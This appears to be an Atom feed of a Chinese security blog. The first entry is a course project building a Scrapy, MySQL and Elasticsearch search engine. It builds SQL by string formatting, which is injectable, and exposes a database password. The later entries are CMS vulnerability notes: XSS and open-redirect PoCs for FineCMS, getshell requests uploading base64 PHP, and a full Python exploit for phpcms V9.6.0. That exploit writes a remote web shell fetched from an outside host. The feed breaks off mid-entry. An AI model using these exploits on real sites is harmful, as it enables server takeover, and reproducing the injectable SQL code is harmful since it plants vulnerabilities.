<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>yeSi</title>
  
  <subtitle>yeSi’s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://note.cfyqy.com/"/>
  <updated>2018-11-20T08:33:56.867Z</updated>
  <id>http://note.cfyqy.com/</id>
  
  <author>
    <name>yeSi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>scrapy+elasticsearch+diango 实现简单的搜索引擎</title>
    <link href="http://note.cfyqy.com/posts/50297.html"/>
    <id>http://note.cfyqy.com/posts/50297.html</id>
    <published>2018-11-15T13:08:00.000Z</published>
    <updated>2018-11-20T08:33:56.867Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一个python的课设，笨拙地折腾了三周多的，原本的学习都被打乱了。不过确实有挺多收获的，学习了挺多知识,像scrapy爬虫框架，搜索和数据分析引擎的elasticsearch,django框架等等，也算是收获匪浅。</p><a id="more"></a><p>本次做课设是基于各个学院的简单搜索引擎。可以分为三大部分，<br>一爬虫<br>二检索<br>三 web  </p><p>先附上本次课设的数据和代码<br>链接：<a href="https://pan.baidu.com/s/1Shr0HpLWiqHEJT_fCEnvuw" target="_blank" rel="noopener">https://pan.baidu.com/s/1Shr0HpLWiqHEJT_fCEnvuw</a> 密码：gf0t   </p><h1 id="爬取学院的数据"><a href="#爬取学院的数据" class="headerlink" title="爬取学院的数据"></a>爬取学院的数据</h1><p>爬虫主要用主流的scrapy框架，写二十一只爬虫分别爬取各个学院的数据<br>目录结构为：<br><img src="/posts/../../images/se/2.png" alt=""><br>各个学院数据的爬取思路都可以总结为：<br>一、请求首页，爬取菜单栏的链接<br>二、分别请求每个菜单栏连接，爬取每篇文章的链接<br>三、请求每个文章链接，得到文章的标题和内容<br>当然每个网站的具体实现方式根据网站的源码而定，</p><p>下面以计算机工程学院为例：<br><img src="/posts/../../images/se/1.png" alt=""></p><h1 id="保存到数据库"><a href="#保存到数据库" class="headerlink" title="保存到数据库"></a>保存到数据库</h1><p>首先是要在mysql中创建好数据库和表 这里表中只有<code>url</code>、<code>title</code>、<code>content</code> 三字字段，<br>例如：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create table cec(</span><br><span class="line">url varchar(200) primary key,</span><br><span class="line">title varchar(200) not null,</span><br><span class="line">content varchar </span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>将scrapy中爬取的数据保存在数据库中，有同步和异步写入，scrapy爬取的速度较快。当数据量大的时候同步写入，容易阻塞，这里就采用异步写入的方法  </p><p>1.在settings配置文件中设置连接参数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数据库地址</span></span><br><span class="line">MYSQL_HOST = <span class="string">'localhost'</span></span><br><span class="line"><span class="comment"># 数据库用户名:</span></span><br><span class="line">MYSQL_USER = <span class="string">'root'</span></span><br><span class="line"><span class="comment">#数据库密码</span></span><br><span class="line">MYSQL_PASSWORD = <span class="string">'yesimysql'</span></span><br><span class="line"><span class="comment">#数据库端口</span></span><br><span class="line">MYSQL_PORT = 3306</span><br><span class="line"><span class="comment">#数据库名称</span></span><br><span class="line">MYSQL_DBNAME = <span class="string">'jimei'</span></span><br><span class="line"><span class="comment">#数据库编码</span></span><br><span class="line">MYSQL_CHARSET = <span class="string">'utf8'</span></span><br></pre></td></tr></table></figure></p><p>2.在iterms.py 定义Item类<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from scrapy.item import Item, Field</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class JimeiItem(Item):</span><br><span class="line"><span class="comment"># define the fields for your item here like:</span></span><br><span class="line"><span class="comment"># name = scrapy.Field()</span></span><br><span class="line">url=Field() <span class="comment">#网站的链接</span></span><br><span class="line">title=Field() <span class="comment"># 网站的标题</span></span><br><span class="line">content=Field() <span class="comment">#网站的内容</span></span><br></pre></td></tr></table></figure></p><p>3.在pipelines文件中声明一个pipeline类   </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pymysql import cursors</span><br><span class="line">from twisted.enterprise import adbapi</span><br><span class="line">from scrapy.conf import settings</span><br><span class="line">from jimei.items import JimeiItem</span><br><span class="line">class jimeiPipeline(object):</span><br><span class="line">def __init__(self,db_pool):</span><br><span class="line">self.db_pool=db_pool</span><br><span class="line">@classmethod</span><br><span class="line">def from_settings(cls,settings):</span><br><span class="line">db_params=dict(</span><br><span class="line">host=settings[<span class="string">'MYSQL_HOST'</span>],</span><br><span class="line">user=settings[<span class="string">'MYSQL_USER'</span>],</span><br><span class="line">password=settings[<span class="string">'MYSQL_PASSWORD'</span>],</span><br><span class="line">port=settings[<span class="string">'MYSQL_PORT'</span>],</span><br><span class="line">database=settings[<span class="string">'MYSQL_DBNAME'</span>],</span><br><span class="line">charset=settings[<span class="string">'MYSQL_CHARSET'</span>],</span><br><span class="line">use_unicode=True,</span><br><span class="line"><span class="comment">#设置游标类型</span></span><br><span class="line">cursorclass=cursors.DictCursor)</span><br><span class="line"><span class="comment"># 创建连接池</span></span><br><span class="line">db_pool=adbapi.ConnectionPool(<span class="string">'pymysql'</span>,**db_params)</span><br><span class="line"><span class="comment"># 返回一个pipline对象</span></span><br><span class="line"><span class="built_in">return</span> cls(db_pool)</span><br><span class="line"></span><br><span class="line">def process_item(self,item,spider):</span><br><span class="line"><span class="comment">#asynItem = copy.deepcopy(item)</span></span><br><span class="line"><span class="comment">## 把要执行的sql放入连接池</span></span><br><span class="line">query=self.db_pool.runInteraction(self.insert_into,item)</span><br><span class="line"><span class="comment"># 如果sql执行发送错误,自动回调addCallBack()函数</span></span><br><span class="line">query.addCallback(self.handle_error)</span><br><span class="line">def insert_into(self,cursor,item):</span><br><span class="line"><span class="comment">#创建sql</span></span><br><span class="line">sql=<span class="string">"insert into szb (url,title,content) values ('&#123;&#125;','&#123;&#125;','&#123;&#125;')"</span>.format(item[<span class="string">'url'</span>],item[<span class="string">'title'</span>],item[<span class="string">'content'</span>])</span><br><span class="line"><span class="comment">#执行sql语句</span></span><br><span class="line">cursor.execute(sql)</span><br><span class="line">def handle_error(self,failure):</span><br><span class="line"><span class="comment">#输出错误信息</span></span><br><span class="line"><span class="built_in">print</span>(failure)</span><br></pre></td></tr></table></figure><p>4.启用pipeline<br>在settings.py中配置<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="string">'jimei.pipelines.jimeiPipeline'</span>: 300,<span class="comment">#根据自己的项目名、类修改</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>5.在爬虫中声明一个item实例，对各个属性进行赋值  例如本次课设中最后提取文章的标题和内容的处理</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from jimei.items import JimeiItem </span><br><span class="line"></span><br><span class="line">def parse_text(self,response):</span><br><span class="line">selector= scrapy.Selector(response)</span><br><span class="line">title=selector.xpath(<span class="string">"//title/text()"</span>).extract()[0] <span class="comment">#得到页面的标题</span></span><br><span class="line">url=response.url  <span class="comment">#页面链接</span></span><br><span class="line"><span class="comment">#content=selector.xpath("string(//form[@name='form124904a'])").extract()[0].replace(u'\r\n','').replace(u'\xa0',u'')</span></span><br><span class="line">content1=selector.css(<span class="string">"form[name='form124904a'] *:not(style)::text"</span>).extract() <span class="comment">#得到页面的内容</span></span><br><span class="line">content=<span class="string">""</span>.join(content1).replace(u<span class="string">'\r\n'</span>,<span class="string">''</span>).replace(u<span class="string">'\xa0'</span>,u<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\'</span><span class="string">','</span><span class="string">').replace('</span>\<span class="string">"','')</span></span><br><span class="line"><span class="string">item=JimeiItem()</span></span><br><span class="line"><span class="string">item['url']=url</span></span><br><span class="line"><span class="string">item['title']=title</span></span><br><span class="line"><span class="string">item['content']=content</span></span><br><span class="line"><span class="string">yield item</span></span><br></pre></td></tr></table></figure><h1 id="elasticsearch-安装"><a href="#elasticsearch-安装" class="headerlink" title="elasticsearch 安装"></a>elasticsearch 安装</h1><p>首先到官网上下载对应系统版本的elasticsearch<br><a href="https://www.elastic.co/downloads/elasticsearch" target="_blank" rel="noopener">https://www.elastic.co/downloads/elasticsearch</a>  </p><p>首先把安装包下载下来并解压，然后运行 bin/elasticsearch（Mac 或 Linux）或者 bin\elasticsearch.bat (Windows) 即可启动 Elasticsearch 了。   </p><p>解压压缩包至指定路径，程序启动入口 elasticsearch-6.4.0\bin\elasticsearch.bat<br>elasticsearch 启动闪退解决：elasticsearch 依赖JDK，必须是1.8以上版本JDK  </p><h2 id="head插件安装"><a href="#head插件安装" class="headerlink" title="head插件安装"></a>head插件安装</h2><p>window下的安装，挺详细的<br><a href="https://www.cnblogs.com/545018520xq/articles/8972036.html" target="_blank" rel="noopener">https://www.cnblogs.com/545018520xq/articles/8972036.html</a>  </p><h2 id="IK中文分词器安装"><a href="#IK中文分词器安装" class="headerlink" title="IK中文分词器安装"></a>IK中文分词器安装</h2><p>window下的安装，挺详细的<br><a href="https://www.cnblogs.com/youran-he/p/7381291.html" target="_blank" rel="noopener">https://www.cnblogs.com/youran-he/p/7381291.html</a> </p><h2 id="logstash安装"><a href="#logstash安装" class="headerlink" title="logstash安装"></a>logstash安装</h2><p>到官网下载leasticsearch对应版本的logstash<br><a href="https://www.elastic.co/downloads/logstash" target="_blank" rel="noopener">https://www.elastic.co/downloads/logstash</a>      </p><h1 id="logstash同步mysql数据到elasticsearch"><a href="#logstash同步mysql数据到elasticsearch" class="headerlink" title="logstash同步mysql数据到elasticsearch"></a>logstash同步mysql数据到elasticsearch</h1><p>1.下载后在logstash\bin目录位置使用logstash-plugin install logstash-input-jdbc 命令安装jdbc的数据连接插件<br><img src="/posts/../../images/se/5.png" alt=""><br>2.logstash\bin目录新增mysql-es.conf文件，配置Input和output参数如下，连接jdbc按照规则同步指定的数据到es，这里的配置有很多种用法。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">input&#123;</span><br><span class="line">     jdbc &#123;</span><br><span class="line">         jdbc_driver_library =&gt; <span class="string">"mysql-connector-java-5.1.44-bin.jar"</span></span><br><span class="line">         jdbc_driver_class =&gt; <span class="string">"com.mysql.jdbc.Driver"</span></span><br><span class="line">         jdbc_connection_string =&gt; <span class="string">"jdbc:mysql://127.0.0.1:3306/jimei"</span></span><br><span class="line">         jdbc_user =&gt; <span class="string">"root"</span></span><br><span class="line">         jdbc_password =&gt; <span class="string">"yesimysql"</span></span><br><span class="line">         jdbc_paging_enabled =&gt; <span class="string">"true"</span></span><br><span class="line">         jdbc_page_size =&gt; <span class="string">"5000"</span></span><br><span class="line">         jdbc_default_timezone =&gt;<span class="string">"Asia/Shanghai"</span></span><br><span class="line">         schedule =&gt; <span class="string">"* * * * *"</span></span><br><span class="line">         statement =&gt; <span class="string">"select * from szb"</span></span><br><span class="line">         last_run_metadata_path =&gt; <span class="string">"./logstash_jdbc_last_run"</span></span><br><span class="line">       &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">"message"</span></span><br><span class="line">        remove_field =&gt; [<span class="string">"message"</span>]</span><br><span class="line">&#125;</span><br><span class="line">mutate &#123;  <span class="comment">#需要移除的字段</span></span><br><span class="line">    remove_field =&gt; <span class="string">"@timestamp"</span></span><br><span class="line">    remove_field =&gt; <span class="string">"type"</span></span><br><span class="line">    <span class="comment"># remove_field =&gt; "@version"</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output&#123;</span><br><span class="line">    elasticsearch &#123;</span><br><span class="line">        hosts =&gt; <span class="string">"127.0.0.1:9200"</span></span><br><span class="line">        index =&gt; <span class="string">"szb"</span></span><br><span class="line">        document_type =&gt; <span class="string">"szb"</span></span><br><span class="line"><span class="comment"># 需要关联的数据库中有一个publication_number字段，对应索引的id号</span></span><br><span class="line">        document_id =&gt; <span class="string">"%&#123;url&#125;"</span></span><br><span class="line">template_overwrite =&gt; <span class="literal">true</span></span><br><span class="line">        template =&gt; <span class="string">"template/logstash-ik.json"</span></span><br><span class="line">     &#125;</span><br><span class="line">     stdout &#123;</span><br><span class="line">        codec =&gt; json_lines</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>3.template设置mapping<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"mappings"</span>: &#123;</span><br><span class="line">         <span class="string">"properties"</span>: &#123;</span><br><span class="line">                <span class="string">"url"</span>: &#123;</span><br><span class="line">                    <span class="string">"type"</span>: <span class="string">"keyword"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"title"</span>: &#123;</span><br><span class="line">                 <span class="string">"norms"</span>: <span class="literal">false</span>,</span><br><span class="line">                 <span class="string">"analyzer"</span>: <span class="string">"ik_max_word"</span>,<span class="comment"># 采用ik分词器</span></span><br><span class="line"><span class="string">"search_analyzer"</span>: <span class="string">"ik_max_word"</span>,</span><br><span class="line">                  <span class="string">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">                   <span class="string">"fields"</span>: &#123;</span><br><span class="line">                     <span class="string">"keyword"</span>: &#123;</span><br><span class="line">                         <span class="string">"type"</span>: <span class="string">"keyword"</span></span><br><span class="line">                          &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"content"</span>: &#123;</span><br><span class="line">                <span class="string">"norms"</span>: <span class="literal">false</span>,</span><br><span class="line">                 <span class="string">"analyzer"</span>: <span class="string">"ik_max_word"</span>,</span><br><span class="line"><span class="string">"search_analyzer"</span>: <span class="string">"ik_max_word"</span>,</span><br><span class="line">                  <span class="string">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">                    <span class="string">"fields"</span>: &#123;</span><br><span class="line">                    <span class="string">"keyword"</span>: &#123;</span><br><span class="line">                         <span class="string">"type"</span>: <span class="string">"keyword"</span></span><br><span class="line">                         &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">                &#125;</span><br><span class="line">         </span><br><span class="line">            &#125;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>4 在logstash\bin目录命令行下运行<br><img src="/posts/../../images/se/6.png" alt=""><br>5.同步后的结果<br><img src="/posts/../../images/se/7.png" alt=""> </p><p>logstash使用template提前设置好maping同步mysql数据到Elasticsearch。也可以参考此文章<br><a href="https://www.cnblogs.com/jstarseven/p/7707499.html" target="_blank" rel="noopener">https://www.cnblogs.com/jstarseven/p/7707499.html</a></p><h1 id="python操作elasticsearch"><a href="#python操作elasticsearch" class="headerlink" title="python操作elasticsearch"></a>python操作elasticsearch</h1><p>参考此文章<br><a href="https://cuiqingcai.com/6214.html" target="_blank" rel="noopener">https://cuiqingcai.com/6214.html</a>  </p><p>es的查询语句实例：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"query"</span>:</span><br><span class="line">&#123;<span class="string">"bool"</span>:</span><br><span class="line">&#123;<span class="string">"must"</span>:[&#123;<span class="string">"match"</span>:&#123;<span class="string">"title"</span>:<span class="string">"计算"</span>&#125;&#125;,</span><br><span class="line">             &#123;<span class="string">"match"</span>:&#123;<span class="string">"content"</span>:<span class="string">"计算"</span>&#125;&#125;]&#125;&#125;,</span><br><span class="line"><span class="string">"from"</span>:1,</span><br><span class="line"><span class="string">"size"</span>:2,</span><br><span class="line">  <span class="string">"_source"</span>: &#123;  </span><br><span class="line">    <span class="string">"includes"</span> : [</span><br><span class="line">      <span class="string">"title"</span>,</span><br><span class="line"><span class="string">"content"</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line"><span class="string">"highlight"</span>: &#123;</span><br><span class="line">    <span class="string">"pre_tags"</span>: [<span class="string">"&lt;span class='keyword'&gt;"</span>],</span><br><span class="line">    <span class="string">"post_tags"</span>: [<span class="string">"&lt;/span&gt;"</span>], </span><br><span class="line">    <span class="string">"fields"</span>: &#123;</span><br><span class="line">      <span class="string">"content"</span>: &#123;</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"plain"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="最终结果展示"><a href="#最终结果展示" class="headerlink" title="最终结果展示"></a>最终结果展示</h1><p><img src="/posts/../../images/se/5.gif" alt=""> </p><p>参考文章：<br>scrapy爬虫学习          <a href="http://www.scrapyd.cn/doc/140.html" target="_blank" rel="noopener">http://www.scrapyd.cn/doc/140.html</a><br>学习elasticsearch不错的博客      <a href="https://www.cnblogs.com/adc8868/default.html?page=5" target="_blank" rel="noopener">https://www.cnblogs.com/adc8868/default.html?page=5</a><br>django学习<br> <a href="https://code.ziqiangxuetang.com/django/django-install.html" target="_blank" rel="noopener">https://code.ziqiangxuetang.com/django/django-install.html</a><br>Scrapy基于Mysql数据库异步写入数据库    <a href="https://blog.csdn.net/baoshuowl/article/details/79658312" target="_blank" rel="noopener">https://blog.csdn.net/baoshuowl/article/details/79658312</a><br>window下head插件的安装   <a href="https://www.cnblogs.com/545018520xq/articles/8972036.html" target="_blank" rel="noopener">https://www.cnblogs.com/545018520xq/articles/8972036.html</a><br>window下ik中文分词器的安装   <a href="https://www.cnblogs.com/youran-he/p/7381291.html" target="_blank" rel="noopener">https://www.cnblogs.com/youran-he/p/7381291.html</a><br>logstash使用template提前设置好maping同步mysql数据到Elasticsearch    <a href="https://www.cnblogs.com/jstarseven/p/7707499.html" target="_blank" rel="noopener">https://www.cnblogs.com/jstarseven/p/7707499.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一个python的课设，笨拙地折腾了三周多的，原本的学习都被打乱了。不过确实有挺多收获的，学习了挺多知识,像scrapy爬虫框架，搜索和数据分析引擎的elasticsearch,django框架等等，也算是收获匪浅。&lt;/p&gt;
    
    </summary>
    
      <category term="项目" scheme="http://note.cfyqy.com/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
      <category term="项目" scheme="http://note.cfyqy.com/tags/%E9%A1%B9%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>finecms</title>
    <link href="http://note.cfyqy.com/posts/20837.html"/>
    <id>http://note.cfyqy.com/posts/20837.html</id>
    <published>2018-11-02T13:28:00.000Z</published>
    <updated>2018-11-16T11:36:59.733Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="finecms分析-5-0-11之前"><a href="#finecms分析-5-0-11之前" class="headerlink" title="finecms分析(5.0.11之前)"></a>finecms分析(5.0.11之前)</h1><p><a href="https://lorexxar.cn/2017/07/26/finecms%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://lorexxar.cn/2017/07/26/finecms%E5%88%86%E6%9E%90/</a><br>任意文件跳转（CVE-2017-11586)<br>poc:<br>随便登入一个用户<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.0.6/index.php?c=weixin&amp;m=sync&amp;url=http://www.baidu.com</span><br></pre></td></tr></table></figure></p><p>登陆接口post型反射型xss(CVE-2017-11581)<br>poc:<br>登陆使用下面的username<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">" onmousemove=alert`1` a="</span>1</span><br><span class="line">``` </span><br><span class="line">登陆失败后，移动鼠标就会触发</span><br><span class="line"></span><br><span class="line">![](../../images/cms/finecms1.png)</span><br><span class="line"></span><br><span class="line">无限制前台反射性xss漏洞(CVE-2017-11629)   </span><br><span class="line">poc:   </span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">http://192.168.0.6/index.php?c=api&amp;m=data2&amp;<span class="keyword">function</span>=&lt;script&gt;alert(1)&lt;/script&gt;p&amp;format=php</span><br></pre></td></tr></table></figure></p><p>还有一些注入看链接    </p><h1 id="FineCMS最新版5-0-8两处getshell"><a href="#FineCMS最新版5-0-8两处getshell" class="headerlink" title="FineCMS最新版5.0.8两处getshell"></a>FineCMS最新版5.0.8两处getshell</h1><p><a href="https://github.com/SecWiki/CMS-Hunter/tree/master/FineCMS/FineCMS%E6%9C%80%E6%96%B0%E7%89%885.0.8%E4%B8%A4%E5%A4%84getshell" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter/tree/master/FineCMS/FineCMS%E6%9C%80%E6%96%B0%E7%89%885.0.8%E4%B8%A4%E5%A4%84getshell</a></p><p>poc:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1/finecms/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=update_avatar&amp;file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/finecms2.png" alt=""></p><p>poc2:<br>先随便注册一个账号<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.0.6/index.php?s=member&amp;c=account&amp;m=upload</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">tx=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/finecms3.png" alt=""></p><h1 id="finecms-5-2SQL注入漏洞复现（CVE-2018-6893）–利用DNS记录进行注入"><a href="#finecms-5-2SQL注入漏洞复现（CVE-2018-6893）–利用DNS记录进行注入" class="headerlink" title="finecms 5.2SQL注入漏洞复现（CVE-2018-6893）–利用DNS记录进行注入"></a>finecms 5.2SQL注入漏洞复现（CVE-2018-6893）–利用DNS记录进行注入</h1><p><a href="https://bbs.ichunqiu.com/thread-36673-1-7.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-36673-1-7.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/cms/"/>
    
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>phpcms</title>
    <link href="http://note.cfyqy.com/posts/21229.html"/>
    <id>http://note.cfyqy.com/posts/21229.html</id>
    <published>2018-10-22T10:42:00.000Z</published>
    <updated>2018-10-28T10:25:12.387Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Phpcms-V9-6-0任意文件写入getshell"><a href="#Phpcms-V9-6-0任意文件写入getshell" class="headerlink" title="Phpcms V9.6.0任意文件写入getshell"></a>Phpcms V9.6.0任意文件写入getshell</h1><p><a href="http://docs.ioin.in/writeup/139.129.31.35/_index_php_archives_524_/index.html" target="_blank" rel="noopener">http://docs.ioin.in/writeup/139.129.31.35/_index_php_archives_524_/index.html</a><br><a href="http://www.freebuf.com/vuls/131648.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/131648.html</a><br>poc:</p><p>在前台注册页面，抓包，将post用一下字符串覆盖，src的一句话.txt地址根据情况写。在repeater里测试go时每一次都要修改username，password和email字段值（不能重复，汗）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">post:</span><br><span class="line">siteid=1&amp;modelid=11&amp;username=zf1agac121&amp;password=aasgfaewee311as&amp;email=a1ea21f94@qq.com&amp;info[content]=&lt;img src=http://note.cfyqy.com/php.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/phpcms1.png" alt=""></p><p>脚本<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">from datetime import datetime</span><br><span class="line">def getTime():</span><br><span class="line">    year = str(datetime.now().year)</span><br><span class="line">    month = <span class="string">"%02d"</span> % datetime.now().month</span><br><span class="line">    day = <span class="string">"%02d"</span> % datetime.now().day</span><br><span class="line">    hour = datetime.now().hour</span><br><span class="line">    hour = hour - 12 <span class="keyword">if</span> hour &gt; 12 <span class="keyword">else</span> hour</span><br><span class="line">    hour = <span class="string">"%02d"</span> % hour</span><br><span class="line">    minute = <span class="string">"%02d"</span> % datetime.now().minute</span><br><span class="line">    second = <span class="string">"%02d"</span> % datetime.now().second</span><br><span class="line">    microsecond = <span class="string">"%06d"</span> % datetime.now().microsecond</span><br><span class="line">    microsecond = microsecond[:3]</span><br><span class="line">    nowTime = year + month + day + hour + minute + second + microsecond</span><br><span class="line">    <span class="built_in">return</span> int(nowTime), year + <span class="string">"/"</span> + month + day + <span class="string">"/"</span></span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; 2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[*]Usage   : Python 1.py http://xxx.com"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">    url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"dsakkfaffdssdudi"</span>,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</span><br><span class="line">        <span class="string">"email"</span>: <span class="string">"dsakkfddsjdi@qq.com"</span>,</span><br><span class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0</span></span><br><span class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;"</span>,</span><br><span class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        startTime, _ = getTime()</span><br><span class="line">        htmlContent = requests.post(url, data=data)</span><br><span class="line">        finishTime, dateUrl = getTime()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text and <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</span><br><span class="line">            successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[*]Shell  : %s"</span> % successUrl)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[-]Notice : writing remoteShell successfully, but failing to get the echo. You can wait the program crawl the uploadfile(in 1-3 second)，or re-run the program after modifying value of username and email.\n"</span>)</span><br><span class="line">            successUrl = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> range(startTime, finishTime):</span><br><span class="line">                checkUrlHtml = requests.get(</span><br><span class="line">                    host + <span class="string">"/uploadfile/"</span> + dateUrl + str(t) + <span class="string">".php"</span>)</span><br><span class="line">                <span class="keyword">if</span> checkUrlHtml.status_code == 200:</span><br><span class="line">                    successUrl = host + <span class="string">"/uploadfile/"</span> + \</span><br><span class="line">                        dateUrl + str(t) + <span class="string">".php"</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">"[*]Shell  : %s"</span> % successUrl)</span><br><span class="line">                    <span class="built_in">break</span></span><br><span class="line">            <span class="keyword">if</span> successUrl == <span class="string">""</span>:</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">"[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n"</span>)</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Request Error"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><h1 id="phpcms-v9-6-0-sql注入与exp"><a href="#phpcms-v9-6-0-sql注入与exp" class="headerlink" title="phpcms_v9.6.0_sql注入与exp"></a>phpcms_v9.6.0_sql注入与exp</h1><p><a href="https://zhuanlan.zhihu.com/p/26263513" target="_blank" 